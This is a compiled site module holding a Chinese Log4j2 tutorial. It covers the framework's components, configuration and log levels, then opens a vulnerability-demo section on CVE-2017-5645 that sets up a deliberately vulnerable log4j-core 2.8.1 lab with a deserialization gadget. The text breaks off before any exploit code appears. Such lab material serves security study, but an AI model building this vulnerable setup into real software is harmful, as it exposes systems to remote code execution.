import{_ as p}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as o,o as l,c,a as n,b as a,d as t,e}from"./app-Q3MS2-a0.js";const i="/DailyNotes/assets/image-20230713154838259-Nnhfagos.png",u="/DailyNotes/assets/image-20230713155351255-1f9gsYTb.png",r="/DailyNotes/assets/image-20230713155701764-_xnkVsFe.png",g="/DailyNotes/assets/image-20230712163753249-TY-1xZXu.png",d="/DailyNotes/assets/image-20230712163807743-QwELa-3_.png",k="/DailyNotes/assets/640-171ZDir1.png",m="/DailyNotes/assets/icloud-_Np4tWzs.png",v="/DailyNotes/assets/jingdong-Vnjp63FH.png",b="/DailyNotes/assets/image-20230714093554406-weIPiQoX.png",h="/DailyNotes/assets/image-20230714093902104-_Ww79dyS.png",f="/DailyNotes/assets/image-20230714094046558-94WaTwe-.png",j="/DailyNotes/assets/image-20230714094607300-bEiWAq6T.png",x="/DailyNotes/assets/image-20230714095658156--gUCyHGs.png",y="/DailyNotes/assets/image-20230714094925609-qaF9mMym.png",_="/DailyNotes/assets/image-20230714095048611-uUnkD4M7.png",L="/DailyNotes/assets/image-20230711141952152-kAipFmWd.png",w="/DailyNotes/assets/image-20230711142555507-FlmfGOqh.png",q="/DailyNotes/assets/image-20230711174730147-Nh7v_Sjx.png",S="/DailyNotes/assets/image-20230711174755203-UdGr46I6.png",A="/DailyNotes/assets/image-20230711174909748-pzQ_pPiU.png",I="/DailyNotes/assets/image-20230711175225943-Cjf6VHoS.png",C="/DailyNotes/assets/image-20230714101905591-O1APuOAm.png",D="/DailyNotes/assets/image-20230714102150354-wrMYe7zo.png",N="/DailyNotes/assets/a4bb089af6008b42679e7c4ca6398dbe-3HogzQ98.png",E="/DailyNotes/assets/593f4fb0b24cee88fa82cd9a5d338c80-KbwiZ4vW.jpeg",M="/DailyNotes/assets/1dcaf79171cc1a3d26443a5b9ed1aef6-7SYNxlzd.png",z="/DailyNotes/assets/4b20d38683952c3b23aa53b027cbcf4b-sUccWm28.png",J="/DailyNotes/assets/1fd329466a336da2e7d181814a7dfe31-UECyDEGY.png",F="/DailyNotes/assets/3de16e565dd49f7577190c6cd2d2f402-d5fo4ch4.jpeg",O="/DailyNotes/assets/3cd9b8498594f1e983a0acddb60d0855-L8zwau1Z.jpeg",V={},P=e(`<h1 id="web主流应用漏洞-log4j2" tabindex="-1"><a class="header-anchor" href="#web主流应用漏洞-log4j2" aria-hidden="true">#</a> web主流应用漏洞-Log4j2</h1><h2 id="_1-apache-log4j2-介绍" tabindex="-1"><a class="header-anchor" href="#_1-apache-log4j2-介绍" aria-hidden="true">#</a> 1. Apache Log4j2 介绍</h2><h3 id="_1-1-什么是log4j2" tabindex="-1"><a class="header-anchor" href="#_1-1-什么是log4j2" aria-hidden="true">#</a> 1.1 什么是Log4j2</h3><p>在日常的开发，测试和生产环境中，日志记录了应用，服务运行过程中的关键信息，以及出现异常时的堆栈，这些信息常常作为查询，定位，解决问题的关键，因此在任何系统中，对日志的使用得当，将极大的提高程序问题解决的效率。</p><p>Apache Log4j是一个Java 日志框架， 旨在为应用程序提供记录日志的功能。 log4j大体可以分为2个版本： 1.x和2.x, 1.x已经不再维护，目前主流的应用版本是2.x, 2.x也被称为log4j2。使用非常广泛，被大量企业和系统所使用，</p><ul><li><p>Log4j的1.x版本虽然已经被广泛使用于很多应用程序中，但由于出现内存泄漏等bug，代码难以维护，以及需要使用老版本的jdk等劣势，在2015年8月已经停止维护。</p></li><li><p>SLF4J：SLF4J是众多日志系统的内核，提供统一的接口，不提供具体实现，不是具体可使用可配置的日志系统。</p></li><li><p>Logback：提供了对SLF4J具体实现的日志系统，相比Log4j1.x，Logback的性能，使用场景，内存使用等方面的优化要远远强于Log4j1.x。</p></li><li><p>Log4j2：Log4j2虽然在各个方面都与logback非常相似，但是却提供了更强的性能和并发性，下一代异步logger，易于拓展自定义需求的架构，是目前使用十分广泛的日志框架。</p></li></ul><blockquote><p>关于日志记录框架的一些基础：</p><p>1、定义标准日志接口的框架，如：Commons Logging、SLF4J、JCL（Jakarta Commons Logging）、jboss-logging；</p><p>2、实现标准日志接口定义的具体实现方案，如：Log4j，Log4j2，Logback，Java Util Logging(Jul)、slf4j-simple、slf4j-nop。</p><p>3、Logback、slf4j-simple、slf4j-nop直接原生实现了slf4j的接口；</p><p>4、 Log4j、Log4j2、Java Util Logging(Jul)没有直接实现slf4j接口，所以需要对应的适配类将SLF4J接口和具体实现类进行绑定（也就是说除了接口和实现类两个依赖外，还需要一个桥接包用于将接口和实现进行绑定）。</p></blockquote><p>log4j2 由四部分构成：</p><ul><li>Logger -- 负责捕获日志记录，并传递给 Appender，他是日志行为的发起者。</li><li>Appender -- 负责将日志事件进行分类处理，将日志发往他应该去的目标去向，因此也可以称为 Handler。</li><li>Layout -- Layout 负责在日志输出前决定日志的格式，因此也可以称为 Fomatter。</li><li>Filter -- Filter 是可选的组件，每一个 Logger、Appender 甚至全局都可以配置若干个 Filter，来决定相应的组件对当前的日志时间是否关心。</li></ul><h3 id="_1-2-log4j2的特点" tabindex="-1"><a class="header-anchor" href="#_1-2-log4j2的特点" aria-hidden="true">#</a> 1.2 Log4j2的特点</h3><ul><li><p>自动重新加载配置：参考了Logback的设计，提供自动刷新参数配置，最实用的就是我们在生产上可以动态的修改日志的级别而无需重启应用</p></li><li><p>异常处理：在logback中，Appender中的异常不会被应用感知到，但是在Log4j2中，提供了一些异常处理机制</p></li><li><p>性能提升：log4j2相较于log4j和logback都具有很明显的性能提升，据官方测试，异步记录器的吞吐量比Log4j 1.x 和 Logback高18倍，延迟低</p></li><li><p>无垃圾机制：（默认开启）log4j2在大部分情况下，都可以使用无垃圾机制【对象重用、内存缓冲】，避免频繁的日志收集导致的 jvm gc</p></li><li><p>插件架构：Log4j2使用插件模式配置组件。因为无需编写代码来创建和配置Appender、Layout、Pattern Converyer等。在配置了的情况下，Log4j2自动识别插件并使用他们</p></li><li><p>高级过滤：与Logback一样，Log4j2支持基于Log事件中的上下文数据，标记，正则表达式和其他组件进行过滤。此外，过滤器还可以与记录器关联。与Logback不同，Log4j2可以在任何这些情况下使用通用的Filter类</p></li><li><p>更强大的参数格式化：</p><p>Log4j的API与SLF4J相比，提供了更丰富的参数格式化功能。使用 {} 占位符格式化参数。用 {} 的方式来实现“format”的功能（参数会直接toString替换占位符），像下面这样：</p></li></ul><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user {} with birthday {}&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用String.format形式格式化参数：Log4j2 中除了支持 {} 的参数占位符，还支持 String.format 的形式</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getFormatterLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user %s with birthday %s&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Logging in user %1$s with birthday %2$tm %2$te,%2$tY&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Integer.MAX_VALUE = %,d、Long.MAX_VALUE = %,d&quot;</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 注意：如果想使用 String.format 的形式，需要使用 LogManager.getFormatterLogger 而不是 LogManager.getLogger</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用logger.printf格式化参数：Log4j2的Logger接口中，还有一个logger.printf()方法，无需创建 LogManager.getFormatterLogger，就可以使用 String.format 的形式</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>
<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span>Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">&quot;com.xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Level</span><span class="token punctuation">.</span><span class="token constant">INFO</span><span class="token punctuation">,</span> <span class="token string">&quot;Logging in user %1$s with birthday %2$tm %2$te,%2$tY&quot;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getBirthdayCalendar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">&quot;Opening connection to {}...&quot;</span><span class="token punctuation">,</span> someDataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-3-log4j2的简单使用" tabindex="-1"><a class="header-anchor" href="#_1-3-log4j2的简单使用" aria-hidden="true">#</a> 1.3 Log4j2的简单使用</h3><p><strong>（1）引用依赖</strong></p><p>在一般项目中使用Log4j2至少需要引用log4j-api-2.x和log4j-core-2.x这两个jar包。</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在spring boot项目中使用Log4j2</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- 排除spring boot默认日志logback --&gt;</span>
    <span class="token comment">&lt;!-- 注意！！！这里必须有 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-logging<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 引入log4j2依赖 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-log4j2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>（2）添加配置文件</strong></p><p>配置文件log4j2.xml一般类似这样：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>

<span class="token comment">&lt;!-- 配置LoggerConfig，即Appenders的日志级别为WARN --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>WARN<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>  
    <span class="token comment">&lt;!-- Appenders支持配置多个Appender，支持向不同的目标输送日志，本例为配置向控制台输出 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>SYSTEM_OUT<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5level %logger{0} - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Pattern</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PatternLayout</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">&gt;</span></span>
    
    <span class="token comment">&lt;!-- Loggers支持配置多个Logger，可引用不同的目标Appender，也可根据业务需求定制特定要求的Appender --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- name属性为项目包名或者类名 --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.jourwon<span class="token punctuation">&quot;</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>debug<span class="token punctuation">&quot;</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>error<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Console<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">&gt;</span></span>
    
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">&gt;</span></span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>默认情况下，Log4j2在classpath下查找名为log4j2.xml的配置文件。</p></li><li><p>也可以使用Java启动命令指定配置文件的全路径。-Dlog4j.configurationFile=opt/demo/log4j2.xml</p></li><li><p>还可以使用Java代码指定配置文件路径，例如</p></li></ul><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">LoggerContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token class-name">LoggerContext</span> loggerContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LoggerContext</span><span class="token punctuation">)</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;opt/demo/log4j2.xml&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    loggerContext<span class="token punctuation">.</span><span class="token function">setConfigLocation</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Web工程web.xml配置监听及加载：</li></ul><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token comment">&lt;!-- Web工程方式加载 --&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>log4jConfiguration<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>classpath:log4j2.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">&gt;</span></span>  

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j.web.Log4jServletContextListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">&gt;</span></span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Log4j2中日志有六个级别（level）：</p><ul><li>trace：追踪，是最低的日志级别，相当于追踪程序的执行，一般不怎么使用</li><li>debug：调试，一般在开发中，都将其设置为最低的日志级别</li><li>info：信息，输出重要的信息，使用较多</li><li>warn：警告，有些时候,虽然程序不会报错，但是还是需要告诉程序员的</li><li>error：错误，这个在开发中也挺常用的</li><li>fatal：严重错误，这个一旦发生，程序基本上也要停止了 当日志级别设置为某个值的时候，低于它的日志信息将不会被记录，只有高于设置的级别的信息会被记录。</li></ul><h2 id="_2-部分历史漏洞演示" tabindex="-1"><a class="header-anchor" href="#_2-部分历史漏洞演示" aria-hidden="true">#</a> 2. 部分历史漏洞演示</h2><h3 id="_2-1-log4j2-反序列化命令执行漏洞-cve-2017-5645" tabindex="-1"><a class="header-anchor" href="#_2-1-log4j2-反序列化命令执行漏洞-cve-2017-5645" aria-hidden="true">#</a> 2.1 Log4j2 反序列化命令执行漏洞（CVE-2017-5645）</h3><p>（1）漏洞介绍</p><p>攻击者可以通过发送一个特别制作的二进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。</p><p>该漏洞主要是由于在处理ObjectInputStream时，接收器对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。目前Log4j官方已经发布新版本修复了该漏洞。</p><p>影响版本：Log4j&lt;2.8.2</p><p>（2） 漏洞原理</p><p>Demo环境（为了漏洞复现成功，添加一条 <strong>commons-collections</strong> 的 <strong>Gadget</strong>）</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
